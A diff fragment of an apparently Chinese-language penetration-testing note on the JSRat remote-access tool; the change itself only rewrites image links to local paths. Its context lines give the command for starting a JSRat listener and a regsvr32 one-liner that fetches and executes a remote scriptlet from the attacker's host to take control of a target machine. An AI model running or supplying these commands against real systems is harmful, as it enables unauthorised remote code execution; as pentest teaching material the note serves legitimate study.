@@ -3,19 +3,19 @@
 	启动
 	>python JSRat.py -i 192.168.0.107 -p 1234
 	MyJSRat可以-c参数指定执行的命令
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/247.png)
+![image](img/247.png)
 
 	/connect是回连地址，/wtf是执行代码
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/248.png)
+![image](img/248.png)
 
 	直接在靶机执行
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/249.png)
+![image](img/249.png)
 
 	或
 	>regsvr32.exe /u /n /s /i:http://192.168.0.107:1234/file.sct scrobj.dll
 	JSRat显示上线
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/250.png)
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/251.png)
+![image](img/250.png)
+![image](img/251.png)
 
 	Wsc方式
 ```xml
